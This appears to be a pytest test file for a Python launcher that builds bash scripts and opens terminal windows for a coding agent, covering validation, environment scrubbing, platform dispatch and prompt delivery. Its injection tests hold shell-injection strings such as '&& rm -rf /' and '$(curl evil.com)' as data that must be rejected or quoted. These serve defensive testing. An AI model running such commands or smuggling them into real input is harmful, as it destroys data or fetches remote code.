"""Unit tests for _terminal_launcher.py (terminal-launcher-port).

Covers (per the WP set):
  - WP-001: validators (entry command / env key / worktree path) +
    _build_launch_script (env-scrub preamble, SULIS_CHANGE_ID export,
    shlex-quoted extra_env, cd-then-exec order).
  - WP-002: platform dispatchers (_launch_macos / _launch_linux /
    _launch_headless) with mocked subprocess + shutil.which; NFR-4
    honest-failure when no Linux terminal app is found.
  - WP-003: launch_change_terminal composition (validation gate,
    launch.sh + session.json persistence, platform dispatch).
  - WP-006: pre_prompt delivery via quoted HERE-DOC + _validate_pre_prompt.

Subprocess + platform are mocked throughout — no real terminal is spawned.
"""

from __future__ import annotations

import json
import shlex
import stat
import subprocess
from pathlib import Path
from unittest import mock

import pytest

import _terminal_launcher as tl


# A valid 26-char Crockford-base32 ULID for tests.
_GOOD_ULID = "01HYQC71000000000000000000"


# ─── WP-001: validate_entry_command ───────────────────────────────────────


def test_validate_entry_command_accepts_default():
    ok, reason = tl.validate_entry_command(
        "claude --dangerously-skip-permissions --agent sulis"
    )
    assert ok is True
    assert reason == ""


@pytest.mark.parametrize("cmd", [
    ";",
    "&& rm -rf /",
    "$(curl evil.com)",
    "claude `whoami`",
    "claude\n--agent",
    "claude; echo pwned",
    "claude | sh",
])
def test_validate_entry_command_rejects_injection(cmd):
    ok, reason = tl.validate_entry_command(cmd)
    assert ok is False
    assert reason


# ─── WP-001: validate_extra_env_key ───────────────────────────────────────


@pytest.mark.parametrize("key", ["SULIS_FOO", "MY_VAR_42", "_X"])
def test_validate_extra_env_key_accepts_posix_names(key):
    ok, reason = tl.validate_extra_env_key(key)
    assert ok is True
    assert reason == ""


@pytest.mark.parametrize("key", [
    "lower",
    "HAS-DASH",
    "HAS\nNEWLINE",
    "1LEADING_DIGIT",
    "HAS SPACE",
    "",
])
def test_validate_extra_env_key_rejects_invalid(key):
    ok, reason = tl.validate_extra_env_key(key)
    assert ok is False
    assert reason


# ─── WP-001: validate_worktree_path ───────────────────────────────────────


def test_validate_worktree_path_accepts_existing_dir(tmp_path):
    ok, resolved = tl.validate_worktree_path(tmp_path)
    assert ok is True
    assert resolved == tmp_path.resolve()


def test_validate_worktree_path_rejects_nonexistent(tmp_path):
    missing = tmp_path / "does-not-exist"
    ok, _ = tl.validate_worktree_path(missing)
    assert ok is False


def test_validate_worktree_path_rejects_file_not_dir(tmp_path):
    f = tmp_path / "a-file.txt"
    f.write_text("hi")
    ok, _ = tl.validate_worktree_path(f)
    assert ok is False


# ─── WP-001: _build_launch_script ─────────────────────────────────────────


def test_build_launch_script_includes_env_scrub(tmp_path):
    script = tl._build_launch_script(_GOOD_ULID, tmp_path)
    # compgen-based scrub that carries over the whitelist...
    assert "compgen -v | grep -Ev" in script
    assert "PATH|HOME|USER|TERM|LANG|LC_.*" in script
    # ...and is hardened against the `set -e` readonly-var abort (the dogfood
    # bug): readonly bash vars excluded + stderr silenced + non-fatal.
    assert "EUID" in script
    assert "SHELLOPTS" in script
    assert "2>/dev/null || true" in script


def test_build_launch_script_exports_sulis_change_id(tmp_path):
    script = tl._build_launch_script(_GOOD_ULID, tmp_path)
    assert f'export SULIS_CHANGE_ID="{_GOOD_ULID}"' in script


def test_build_launch_script_inserts_extra_env_shlex_quoted(tmp_path):
    script = tl._build_launch_script(
        _GOOD_ULID, tmp_path, extra_env={"FOO": "bar; rm -rf /"},
    )
    assert "export FOO='bar; rm -rf /'" in script


def test_build_launch_script_wires_origin_hook(tmp_path):
    """WP-P12 — the executor session launch wires the prepare-commit-msg hook
    so commits the session makes carry the Sulis-Origin trailer. The hook path
    is set via GIT_CONFIG_* env (no .git/config mutation) and SULIS_SCRIPTS_DIR
    lets the hook locate _origin_stamp."""
    script = tl._build_launch_script(_GOOD_ULID, tmp_path, enable_origin_hook=True)
    assert "GIT_CONFIG_COUNT" in script
    assert "core.hooksPath" in script
    assert "GIT_CONFIG_VALUE_0" in script
    # The configured hooks dir is the scripts/hooks dir holding the hook.
    assert "hooks" in script
    assert "export SULIS_SCRIPTS_DIR=" in script
    # The exports come AFTER the env-scrub (which would otherwise strip them).
    scrub_idx = script.index("compgen -v")
    cfg_idx = script.index("GIT_CONFIG_COUNT")
    assert scrub_idx < cfg_idx


def test_build_launch_script_omits_origin_hook_by_default(tmp_path):
    """Default (no flag) is byte-compatible with the prior baseline."""
    script = tl._build_launch_script(_GOOD_ULID, tmp_path)
    assert "GIT_CONFIG_COUNT" not in script
    assert "core.hooksPath" not in script


def test_build_launch_script_cd_then_exec_order(tmp_path):
    script = tl._build_launch_script(_GOOD_ULID, tmp_path)
    cd_idx = script.index('cd "')
    exec_idx = script.index("exec ")
    assert cd_idx < exec_idx


# ─── Regression: execute the generated script under bash ───────────────────
# The mocked content-assertion tests above never *ran* the script, so the
# `set -euo pipefail` abort on bash readonly vars (EUID/UID/PPID/SHELLOPTS/...)
# in the env-scrub line was invisible — a real spawn dropped to a bare shell
# and `claude` never started. This test actually executes the generated
# script under bash with the entry_command swapped for a harmless marker,
# proving the env-scrub does NOT abort and the final exec line is reached.


def test_generated_script_runs_to_exec_under_bash(tmp_path):
    """The generated launch script must run to its exec line under bash.

    Regression guard for the env-scrub `set -e` abort: bash readonly vars
    (EUID, UID, PPID, SHELLOPTS, BASH_VERSINFO, ...) are present in this very
    process, so a non-resilient `unset` of them aborts the script before the
    exec line. We swap entry_command for a harmless lowercase marker the
    validator accepts (`printf reached-exec`) and assert the marker is printed
    AND the script exits 0.
    """
    script = tl._build_launch_script(
        _GOOD_ULID, tmp_path, entry_command="printf reached-exec",
    )
    script_path = tmp_path / "launch.sh"
    script_path.write_text(script)
    result = subprocess.run(
        ["bash", str(script_path)],
        capture_output=True,
        text=True,
        cwd=str(tmp_path),
    )
    assert result.returncode == 0, (
        f"script aborted (exit {result.returncode}); "
        f"stderr={result.stderr!r}"
    )
    assert "reached-exec" in result.stdout, (
        f"exec line not reached; stdout={result.stdout!r} "
        f"stderr={result.stderr!r}"
    )


def test_generated_script_scrub_does_not_spam_readonly_errors(tmp_path):
    """The env-scrub must not print `cannot unset ... readonly variable` spam.

    Even with `|| true` guarding the exit code, an unguarded stderr stream
    floods the founder's terminal with one error line per bash readonly var.
    Routing stderr to /dev/null keeps the spawned window clean.
    """
    script = tl._build_launch_script(
        _GOOD_ULID, tmp_path, entry_command="printf reached-exec",
    )
    script_path = tmp_path / "launch.sh"
    script_path.write_text(script)
    result = subprocess.run(
        ["bash", str(script_path)],
        capture_output=True,
        text=True,
        cwd=str(tmp_path),
    )
    assert "readonly variable" not in result.stderr, (
        f"env-scrub spammed readonly-var errors: stderr={result.stderr!r}"
    )
    assert "cannot unset" not in result.stderr


# ─── #107: a stale inherited SULIS_CHANGE_ID must never win ────────────────
# The bug: a newly-spawned change window inherited a STALE SULIS_CHANGE_ID
# (from the cockpit's background service env / Terminal.app retained env). The
# launch.sh `export SULIS_CHANGE_ID=...` set it in the shell env, but the
# inherited value re-shadowed it inside claude's interactive shell, so the
# session bound to the WRONG change. Fix: set the new id DIRECTLY on the
# exec'd process via `env SULIS_CHANGE_ID=<id> ...`, plus `unset` before the
# export — so nothing inherited can shadow it.


def test_build_launch_script_unsets_before_exporting_change_id(tmp_path):
    """Belt-and-braces: the stale value is unset before the authoritative
    export, so a re-shadowed inherited value can't survive the export line."""
    script = tl._build_launch_script(_GOOD_ULID, tmp_path)
    unset_idx = script.index("unset SULIS_CHANGE_ID")
    export_idx = script.index(f'export SULIS_CHANGE_ID="{_GOOD_ULID}"')
    assert unset_idx < export_idx


def test_exec_line_sets_change_id_on_the_process_default_viewer(tmp_path):
    """The viewer (default) exec line must carry `env SULIS_CHANGE_ID=<new>` so
    the id is set on the viewer's OWN process, not just an env a child shell can
    re-shadow."""
    script = tl._build_launch_script(_GOOD_ULID, tmp_path)
    exec_line = next(ln for ln in script.splitlines() if ln.startswith("exec "))
    assert f"env SULIS_CHANGE_ID={shlex.quote(_GOOD_ULID)}" in exec_line


def test_exec_line_sets_change_id_on_the_process_chat_style(tmp_path):
    """The chat-style claude exec line must likewise carry
    `env SULIS_CHANGE_ID=<new>` on claude's own process."""
    script = tl._build_launch_script(
        _GOOD_ULID, tmp_path,
        entry_command="claude --dangerously-skip-permissions --agent sulis",
    )
    exec_line = next(ln for ln in script.splitlines() if ln.startswith("exec "))
    assert f"env SULIS_CHANGE_ID={shlex.quote(_GOOD_ULID)}" in exec_line
    assert "claude" in exec_line


def test_generated_script_binds_new_id_even_with_stale_in_env(tmp_path):
    """End-to-end RED→GREEN: run the generated script under bash with a STALE
    SULIS_CHANGE_ID pre-set and a stubbed `claude` that echoes the id its own
    process sees. The process MUST see the NEW id, not the stale one."""
    stale = "01HSTALE00000000000000000Z"
    # A stub `claude` on PATH that prints whatever SULIS_CHANGE_ID its process
    # was launched with. entry_command must pass the lowercase whitelist.
    stub_dir = tmp_path / "bin"
    stub_dir.mkdir()
    stub = stub_dir / "claude"
    stub.write_text('#!/usr/bin/env bash\nprintf "id=%s\\n" "$SULIS_CHANGE_ID"\n')
    stub.chmod(0o755)
    script = tl._build_launch_script(
        _GOOD_ULID, tmp_path, entry_command="claude",
    )
    script_path = tmp_path / "launch.sh"
    script_path.write_text(script)
    env = {
        "SULIS_CHANGE_ID": stale,
        "PATH": f"{stub_dir}:/usr/bin:/bin",
        "HOME": str(tmp_path),
    }
    result = subprocess.run(
        ["bash", str(script_path)],
        capture_output=True, text=True, cwd=str(tmp_path), env=env,
    )
    assert result.returncode == 0, f"script aborted: stderr={result.stderr!r}"
    assert f"id={_GOOD_ULID}" in result.stdout, (
        f"claude bound to the wrong change; stdout={result.stdout!r}"
    )
    assert stale not in result.stdout, (
        f"stale id leaked into claude's process; stdout={result.stdout!r}"
    )


# ─── WP-002: _launch_macos ────────────────────────────────────────────────


def _fake_osascript(stdout: str):
    """Build a fake subprocess.run CompletedProcess-like object."""
    fake = mock.Mock()
    fake.stdout = stdout
    fake.stderr = ""
    fake.returncode = 0
    return fake


def test_launch_macos_invokes_osascript(tmp_path):
    script_path = tmp_path / "launch.sh"
    script_path.write_text("#!/usr/bin/env bash\n")
    with mock.patch.object(tl.subprocess, "run",
                           return_value=_fake_osascript("/dev/ttys003\n")) as p:
        tl._launch_macos(script_path, _GOOD_ULID, visible=True)
    args = p.call_args[0][0]
    assert "osascript" in args
    joined = " ".join(args)
    assert "tell" in joined and "Terminal" in joined and "do script" in joined


def test_launch_macos_activates_terminal_to_foreground(tmp_path):
    """Bug 3: the AppleScript must `activate` Terminal so the window comes to
    the foreground rather than opening behind the founder's current app."""
    script_path = tmp_path / "launch.sh"
    script_path.write_text("#!/usr/bin/env bash\n")
    with mock.patch.object(tl.subprocess, "run",
                           return_value=_fake_osascript("/dev/ttys003\n")) as p:
        tl._launch_macos(script_path, _GOOD_ULID, visible=True)
    joined = " ".join(p.call_args[0][0])
    assert "activate" in joined


def test_launch_macos_captures_tty_as_session_handle(tmp_path):
    """Bug 2: when the tab's tty is read back, record it with
    pid_kind="session" (a real liveness handle) instead of a dead pid."""
    script_path = tmp_path / "launch.sh"
    script_path.write_text("#!/usr/bin/env bash\n")
    with mock.patch.object(tl.subprocess, "run",
                           return_value=_fake_osascript("/dev/ttys007\n")):
        result = tl._launch_macos(script_path, _GOOD_ULID, visible=True)
    assert result["status"] == "spawned"
    assert result["terminal_app_used"] == "Terminal.app"
    assert result["tty"] == "/dev/ttys007"
    assert result["pid_kind"] == "session"
    assert result["error"] is None


def test_launch_macos_degrades_honestly_when_no_tty(tmp_path):
    """Bug 2 honest-degrade: if the tty can't be parsed, flag
    pid_kind="launcher" (don't record a misleading handle)."""
    script_path = tmp_path / "launch.sh"
    script_path.write_text("#!/usr/bin/env bash\n")
    with mock.patch.object(tl.subprocess, "run",
                           return_value=_fake_osascript("garbage not-a-tty\n")):
        result = tl._launch_macos(script_path, _GOOD_ULID, visible=True)
    assert result["status"] == "spawned"
    assert result["tty"] is None
    assert result["pid_kind"] == "launcher"


def test_launch_macos_returns_spawned_dict(tmp_path):
    script_path = tmp_path / "launch.sh"
    script_path.write_text("#!/usr/bin/env bash\n")
    with mock.patch.object(tl.subprocess, "run",
                           return_value=_fake_osascript("/dev/ttys003\n")):
        result = tl._launch_macos(script_path, _GOOD_ULID, visible=True)
    assert result["status"] == "spawned"
    assert result["terminal_app_used"] == "Terminal.app"
    assert result["error"] is None


# ─── WP-002: _launch_linux ────────────────────────────────────────────────


def test_launch_linux_tries_gnome_first(tmp_path):
    script_path = tmp_path / "launch.sh"
    script_path.write_text("#!/usr/bin/env bash\n")
    fake_proc = mock.Mock()
    fake_proc.pid = 99
    which_map = {"gnome-terminal": "/usr/bin/gnome-terminal"}
    with mock.patch.object(tl.shutil, "which", side_effect=which_map.get), \
            mock.patch.object(tl.subprocess, "Popen", return_value=fake_proc) as p:
        result = tl._launch_linux(script_path, _GOOD_ULID, visible=True)
    assert result["status"] == "spawned"
    assert result["terminal_app_used"] == "gnome-terminal"
    assert "gnome-terminal" in p.call_args[0][0]


def test_launch_linux_falls_back_to_konsole(tmp_path):
    script_path = tmp_path / "launch.sh"
    script_path.write_text("#!/usr/bin/env bash\n")
    fake_proc = mock.Mock()
    fake_proc.pid = 99
    which_map = {"konsole": "/usr/bin/konsole"}
    with mock.patch.object(tl.shutil, "which", side_effect=which_map.get), \
            mock.patch.object(tl.subprocess, "Popen", return_value=fake_proc):
        result = tl._launch_linux(script_path, _GOOD_ULID, visible=True)
    assert result["status"] == "spawned"
    assert result["terminal_app_used"] == "konsole"


def test_launch_linux_falls_back_to_xterm(tmp_path):
    script_path = tmp_path / "launch.sh"
    script_path.write_text("#!/usr/bin/env bash\n")
    fake_proc = mock.Mock()
    fake_proc.pid = 99
    which_map = {"xterm": "/usr/bin/xterm"}
    with mock.patch.object(tl.shutil, "which", side_effect=which_map.get), \
            mock.patch.object(tl.subprocess, "Popen", return_value=fake_proc):
        result = tl._launch_linux(script_path, _GOOD_ULID, visible=True)
    assert result["status"] == "spawned"
    assert result["terminal_app_used"] == "xterm"


def test_launch_linux_fails_when_no_terminal_app(tmp_path):
    script_path = tmp_path / "launch.sh"
    script_path.write_text("#!/usr/bin/env bash\n")
    with mock.patch.object(tl.shutil, "which", return_value=None), \
            mock.patch.object(tl.subprocess, "Popen") as p:
        result = tl._launch_linux(script_path, _GOOD_ULID, visible=True)
    assert result["status"] == "failed"
    assert result["error"]
    assert "gnome-terminal" in result["error"]
    assert p.call_count == 0  # NFR-4: no silent fallback subprocess


# ─── WP-002: _launch_headless ─────────────────────────────────────────────


def test_launch_headless_uses_background_subprocess(tmp_path):
    script_path = tmp_path / "launch.sh"
    script_path.write_text("#!/usr/bin/env bash\n")
    fake_proc = mock.Mock()
    fake_proc.pid = 7
    with mock.patch.object(tl.subprocess, "Popen", return_value=fake_proc) as p:
        tl._launch_headless(script_path, _GOOD_ULID)
    kwargs = p.call_args.kwargs
    assert kwargs.get("stdout") == tl.subprocess.DEVNULL


def test_launch_headless_returns_spawned_dict(tmp_path):
    script_path = tmp_path / "launch.sh"
    script_path.write_text("#!/usr/bin/env bash\n")
    fake_proc = mock.Mock()
    fake_proc.pid = 7
    with mock.patch.object(tl.subprocess, "Popen", return_value=fake_proc):
        result = tl._launch_headless(script_path, _GOOD_ULID)
    assert result["status"] == "spawned"
    assert result["terminal_app_used"] == "headless"


# ─── WP-003: launch_change_terminal ───────────────────────────────────────


def _spawned_dict(script_path: Path) -> dict:
    return {
        "status": "spawned",
        "pid": None,
        "pid_kind": "session",
        "tty": "/dev/ttys009",
        "terminal_app_used": "Terminal.app",
        "script_path": str(script_path),
        "error": None,
    }


def test_launch_change_terminal_validates_change_id(tmp_path):
    with mock.patch.object(tl.subprocess, "Popen") as p:
        with pytest.raises(ValueError):
            tl.launch_change_terminal("not-a-ulid", tmp_path)
    assert p.call_count == 0


def test_launch_change_terminal_validates_worktree_path(tmp_path):
    missing = tmp_path / "nope"
    with pytest.raises(ValueError):
        tl.launch_change_terminal(_GOOD_ULID, missing)


def test_launch_change_terminal_writes_executable_launch_script(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    with mock.patch.object(tl.platform, "system", return_value="Darwin"), \
            mock.patch.object(tl, "_launch_macos",
                              side_effect=lambda sp, cid, vis: _spawned_dict(sp)):
        result = tl.launch_change_terminal(_GOOD_ULID, tmp_path)
    script_path = Path(result["script_path"])
    assert script_path.exists()
    mode = script_path.stat().st_mode
    assert mode & stat.S_IXUSR


def test_launch_change_terminal_writes_session_json_on_spawn(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    with mock.patch.object(tl.platform, "system", return_value="Darwin"), \
            mock.patch.object(tl, "_launch_macos",
                              side_effect=lambda sp, cid, vis: _spawned_dict(sp)):
        result = tl.launch_change_terminal(_GOOD_ULID, tmp_path)
    sj = Path(result["session_json_path"])
    assert sj.exists()
    payload = json.loads(sj.read_text())
    assert payload["change_id"] == _GOOD_ULID
    assert payload["terminal_app_used"] == "Terminal.app"
    assert "spawned_at" in payload
    # Bug 2: session.json records pid_kind + tty so focus's liveness check
    # has a real handle and never trusts a known-dead launcher pid.
    assert payload["pid_kind"] == "session"
    assert payload["tty"] == "/dev/ttys009"


def test_launch_change_terminal_does_not_write_session_json_on_failure(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    failed = {
        "status": "failed", "pid": None, "terminal_app_used": None,
        "script_path": "", "error": "boom",
    }
    with mock.patch.object(tl.platform, "system", return_value="Darwin"), \
            mock.patch.object(tl, "_launch_macos",
                              side_effect=lambda sp, cid, vis: {**failed, "script_path": str(sp)}):
        result = tl.launch_change_terminal(_GOOD_ULID, tmp_path)
    assert result["status"] == "failed"
    sj = Path(result["session_json_path"]) if result.get("session_json_path") else None
    if sj is not None:
        assert not sj.exists()


def test_launch_change_terminal_dispatches_to_macos_on_darwin(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    with mock.patch.object(tl.platform, "system", return_value="Darwin"), \
            mock.patch.object(tl, "_launch_macos",
                              side_effect=lambda sp, cid, vis: _spawned_dict(sp)) as m:
        tl.launch_change_terminal(_GOOD_ULID, tmp_path)
    assert m.call_count == 1


def test_launch_change_terminal_dispatches_to_linux_on_linux(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    with mock.patch.object(tl.platform, "system", return_value="Linux"), \
            mock.patch.object(tl, "_launch_linux",
                              side_effect=lambda sp, cid, vis: _spawned_dict(sp)) as m:
        tl.launch_change_terminal(_GOOD_ULID, tmp_path)
    assert m.call_count == 1


def test_launch_change_terminal_fails_on_unknown_platform_visible(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    with mock.patch.object(tl.platform, "system", return_value="Windows"):
        result = tl.launch_change_terminal(_GOOD_ULID, tmp_path, visible=True)
    assert result["status"] == "failed"
    assert "unsupported platform" in result["error"].lower()


def test_launch_change_terminal_uses_headless_on_unknown_platform_invisible(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    with mock.patch.object(tl.platform, "system", return_value="Windows"), \
            mock.patch.object(tl, "_launch_headless",
                              side_effect=lambda sp, cid: _spawned_dict(sp)) as m:
        tl.launch_change_terminal(_GOOD_ULID, tmp_path, visible=False)
    assert m.call_count == 1


# ─── Hardening: file-I/O guards (OSError → structured _failed) ────────────


def test_launch_change_terminal_returns_failed_when_write_text_raises(tmp_path, monkeypatch):
    """An unwritable launch.sh path must surface a structured failure, not raise."""
    monkeypatch.setenv("HOME", str(tmp_path))
    with mock.patch.object(tl.platform, "system", return_value="Darwin"), \
            mock.patch.object(tl.Path, "write_text",
                              side_effect=PermissionError(13, "Permission denied")), \
            mock.patch.object(tl.subprocess, "Popen") as p:
        result = tl.launch_change_terminal(_GOOD_ULID, tmp_path)
    assert result["status"] == "failed"
    assert result["pid"] is None
    assert result["error"]
    assert "launch.sh" in result["error"]
    assert "session_json_path" in result
    assert result["session_json_path"] == ""
    assert p.call_count == 0  # never reached the spawn


def test_launch_change_terminal_returns_failed_when_chmod_raises(tmp_path, monkeypatch):
    """A chmod failure on the launch script must degrade to a structured failure."""
    monkeypatch.setenv("HOME", str(tmp_path))
    with mock.patch.object(tl.platform, "system", return_value="Darwin"), \
            mock.patch.object(tl.Path, "chmod",
                              side_effect=OSError(30, "Read-only file system")), \
            mock.patch.object(tl.subprocess, "Popen") as p:
        result = tl.launch_change_terminal(_GOOD_ULID, tmp_path)
    assert result["status"] == "failed"
    assert result["error"]
    assert p.call_count == 0


def test_launch_change_terminal_returns_failed_when_mkdir_raises(tmp_path, monkeypatch):
    """An unwritable ~/.sulis/changes dir must surface a structured failure."""
    monkeypatch.setenv("HOME", str(tmp_path))
    with mock.patch.object(tl.platform, "system", return_value="Darwin"), \
            mock.patch.object(tl.Path, "mkdir",
                              side_effect=PermissionError(13, "Permission denied")), \
            mock.patch.object(tl.subprocess, "Popen") as p:
        result = tl.launch_change_terminal(_GOOD_ULID, tmp_path)
    assert result["status"] == "failed"
    assert result["error"]
    # The change_id should appear in the error so the founder can locate the path.
    assert _GOOD_ULID in result["error"] or ".sulis" in result["error"]
    assert p.call_count == 0


def test_launch_change_terminal_failure_error_names_the_os_error(tmp_path, monkeypatch):
    """The structured error message must include the underlying OS error text."""
    monkeypatch.setenv("HOME", str(tmp_path))
    with mock.patch.object(tl.platform, "system", return_value="Darwin"), \
            mock.patch.object(tl.Path, "write_text",
                              side_effect=OSError(28, "No space left on device")):
        result = tl.launch_change_terminal(_GOOD_ULID, tmp_path)
    assert result["status"] == "failed"
    assert "No space left on device" in result["error"]


# ─── WP-006: _validate_pre_prompt ─────────────────────────────────────────


def test_validate_pre_prompt_accepts_none():
    ok, reason = tl._validate_pre_prompt(None)
    assert ok is True
    assert reason == ""


def test_validate_pre_prompt_accepts_short_text():
    ok, reason = tl._validate_pre_prompt("You are Sulis, focused on change CH-01.")
    assert ok is True
    assert reason == ""


def test_validate_pre_prompt_allows_former_heredoc_tag_text():
    # Since #86 the pre_prompt is delivered via a sidecar file, never a
    # heredoc — so text that happens to mention the old tag is no longer
    # dangerous and must NOT be rejected (its bytes are never shell-parsed).
    ok, reason = tl._validate_pre_prompt("brief ... SULIS_PROMPT_EOF ... more")
    assert ok is True
    assert reason == ""


def test_validate_pre_prompt_rejects_oversize():
    body = "x" * (tl._PRE_PROMPT_MAX_BYTES + 1)
    ok, reason = tl._validate_pre_prompt(body)
    assert ok is False
    assert reason


# ─── WP-006: _build_launch_script with pre_prompt ─────────────────────────


def test_build_launch_script_no_pre_prompt_byte_identical_to_baseline(tmp_path):
    baseline = tl._build_launch_script(_GOOD_ULID, tmp_path)
    with_none = tl._build_launch_script(_GOOD_ULID, tmp_path, pre_prompt=None)
    assert baseline == with_none


def test_build_launch_script_with_pre_prompt_reads_sidecar(tmp_path):
    # The sidecar-`cat` brief-delivery lives on the chat-style entry_command
    # path (the default path now runs the viewer, WP-006, which takes the brief
    # via the daemon — see test_terminal_launcher_runs_viewer.py). Pass an
    # explicit chat-style command to exercise the cat delivery.
    script = tl._build_launch_script(
        _GOOD_ULID, tmp_path,
        entry_command="claude --dangerously-skip-permissions --agent sulis",
        pre_prompt="hello world",
    )
    # Delivered via a sidecar file read at runtime, NOT a heredoc (#86).
    assert "<<'SULIS_PROMPT_EOF'" not in script
    assert tl._PRE_PROMPT_SIDECAR in script        # references pre_prompt.txt
    assert '"$(cat ' in script                      # captured as one argv element


def test_build_launch_script_pre_prompt_not_inline(tmp_path):
    # The brief is NOT embedded in the script (it lives in the sidecar), so
    # bash never parses its bytes — shell metacharacters are inert (#86).
    body = "Brief with $HOME and `backticks` and $(curl evil.com) inside."
    script = tl._build_launch_script(_GOOD_ULID, tmp_path, pre_prompt=body)
    assert body not in script


def test_build_launch_script_parses_under_bash_with_tricky_chars(tmp_path):
    # The #86 regression: an apostrophe in the brief killed the launch under
    # macOS bash 3.2 (a quoted heredoc nested in "$(...)" mis-parses the
    # apostrophe as an unterminated quote). The generated script MUST parse
    # (bash -n) with apostrophes, double-quotes, backticks and $ present.
    import shutil
    import subprocess
    bash = shutil.which("bash")
    if bash is None:
        pytest.skip("bash not available")
    body = ("render each change's data contract; say \"hi\"; `backtick`; "
            "$HOME; it's done -> next steps")
    script = tl._build_launch_script(_GOOD_ULID, tmp_path, pre_prompt=body)
    sh = tmp_path / "launch.sh"
    sh.write_text(script)
    r = subprocess.run([bash, "-n", str(sh)], capture_output=True, text=True)
    assert r.returncode == 0, f"launch.sh has a syntax error: {r.stderr}"


def test_build_launch_script_invokes_pre_prompt_validator(tmp_path):
    # The remaining guard is size; an oversize brief still raises.
    with pytest.raises(ValueError):
        tl._build_launch_script(
            _GOOD_ULID, tmp_path,
            pre_prompt="x" * (tl._PRE_PROMPT_MAX_BYTES + 1),
        )


def test_launch_change_terminal_forwards_pre_prompt(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    with mock.patch.object(tl.platform, "system", return_value="Darwin"), \
            mock.patch.object(tl, "_launch_macos",
                              side_effect=lambda sp, cid, vis: _spawned_dict(sp)), \
            mock.patch.object(tl, "_build_launch_script",
                              wraps=tl._build_launch_script) as b:
        tl.launch_change_terminal(_GOOD_ULID, tmp_path, pre_prompt="hello")
    assert b.call_args.kwargs.get("pre_prompt") == "hello" or "hello" in b.call_args[0]


# ─── #93: default opening prompt so a re-spawned session never sits idle ──────


def test_default_change_pre_prompt_is_change_oriented():
    body = tl._default_change_pre_prompt(_GOOD_ULID)
    assert _GOOD_ULID in body              # binds the brief to this change
    assert "CONTEXT.md" in body            # points at the pre-spawn recon
    assert "change-context" in body        # tells Sulis to greet in change-context mode
    assert "route" in body.lower()         # and route to the right stage


def test_launch_change_terminal_defaults_opening_prompt_when_none(tmp_path, monkeypatch):
    # The #93 bug: focus/recreate re-spawn with pre_prompt=None → claude came up
    # bound to the change but idle (no opening turn; the agent never reads
    # SULIS_CHANGE_ID until the user types). The launcher must default a
    # change-context opening prompt so ANY caller's session auto-starts.
    # The default-prompt behaviour lives on the launch-script path, which a
    # visible launch reaches by default (CH-01KTK7) — no flag required.
    monkeypatch.setenv("HOME", str(tmp_path))
    with mock.patch.object(tl.platform, "system", return_value="Darwin"), \
            mock.patch.object(tl, "_launch_macos",
                              side_effect=lambda sp, cid, vis: _spawned_dict(sp)):
        result = tl.launch_change_terminal(_GOOD_ULID, tmp_path, pre_prompt=None)
    # the sidecar carrying the opening prompt was written...
    sidecar = tl._change_dir(_GOOD_ULID) / tl._PRE_PROMPT_SIDECAR
    assert sidecar.exists(), "no opening prompt delivered — the session would sit idle"
    assert _GOOD_ULID in sidecar.read_text()
    # ...and the default window runs the viewer (WP-006), which attaches the
    # change's shared session over the daemon. The daemon's interactive pty
    # adapter reads this same sidecar via SULIS_CHANGE_ID and briefs the
    # session's claude on its first turn — so the brief is delivered through the
    # daemon, not via the launch-script `cat` (that path is now the explicit
    # chat-style entry_command only). The launch script still exports
    # SULIS_CHANGE_ID so the adapter can find the sidecar.
    script = Path(result["script_path"]).read_text()
    assert "session_viewer.py" in script
    assert f'export SULIS_CHANGE_ID="{_GOOD_ULID}"' in script


def test_launch_change_terminal_explicit_pre_prompt_not_overridden(tmp_path, monkeypatch):
    # start --spawn passes a rich brief; the default must never clobber it.
    # The sidecar write lives on the launch-script path, which a visible launch
    # reaches by default (CH-01KTK7) — no flag required.
    monkeypatch.setenv("HOME", str(tmp_path))
    with mock.patch.object(tl.platform, "system", return_value="Darwin"), \
            mock.patch.object(tl, "_launch_macos",
                              side_effect=lambda sp, cid, vis: _spawned_dict(sp)):
        tl.launch_change_terminal(
            _GOOD_ULID, tmp_path, pre_prompt="custom brief from start --spawn",
        )
    sidecar = tl._change_dir(_GOOD_ULID) / tl._PRE_PROMPT_SIDECAR
    assert sidecar.read_text() == "custom brief from start --spawn"


def test_launch_change_terminal_writes_pre_prompt_sidecar(tmp_path, monkeypatch):
    # The brief lands in the sidecar file the exec line reads, with its exact
    # bytes (apostrophes/quotes/backticks included) — never inline (#86).
    monkeypatch.setenv("HOME", str(tmp_path))
    body = "render each change's contract -- apostrophe, \"quote\", `tick`"
    with mock.patch.object(tl.platform, "system", return_value="Darwin"), \
            mock.patch.object(tl, "_launch_macos",
                              side_effect=lambda sp, cid, vis: _spawned_dict(sp)):
        tl.launch_change_terminal(_GOOD_ULID, tmp_path, pre_prompt=body)
    sidecar = tl._change_dir(_GOOD_ULID) / tl._PRE_PROMPT_SIDECAR
    assert sidecar.read_text() == body


# ─── CH-01KTK7: visible launch opens a terminal by DEFAULT (reverse-strangle) ─
#
# WP-009 had Strangled the OS-window path to a deprecated, flag-gated fallback:
# a visible launch returned a _failed pointer to the in-cockpit <LiveTerminal/>
# unless SULIS_TERMINAL_OS_WINDOW=1 was set. CH-01KTK7 reverses that DEFAULT:
# `start --spawn` wants a real terminal to open, so a VISIBLE launch now
# dispatches to the platform launcher by default — no flag required. The
# SULIS_TERMINAL_OS_WINDOW flag remains as an explicit override knob but is no
# longer needed for the default-on behaviour. The in-cockpit <LiveTerminal/> is
# a SEPARATE browser-rendering capability, untouched.


def test_os_window_enabled_helper_still_reads_flag(monkeypatch):
    # The flag helper is retained as an explicit override knob. With no flag set
    # it reports False; the DEFAULT-ON spawn behaviour no longer depends on it.
    monkeypatch.delenv(tl._OS_WINDOW_FLAG, raising=False)
    assert tl._os_window_enabled() is False


@pytest.mark.parametrize("value", ["1", "true", "TRUE", "yes", "on"])
def test_os_window_enabled_by_truthy_flag(monkeypatch, value):
    monkeypatch.setenv(tl._OS_WINDOW_FLAG, value)
    assert tl._os_window_enabled() is True


@pytest.mark.parametrize("value", ["", "0", "false", "no", "off"])
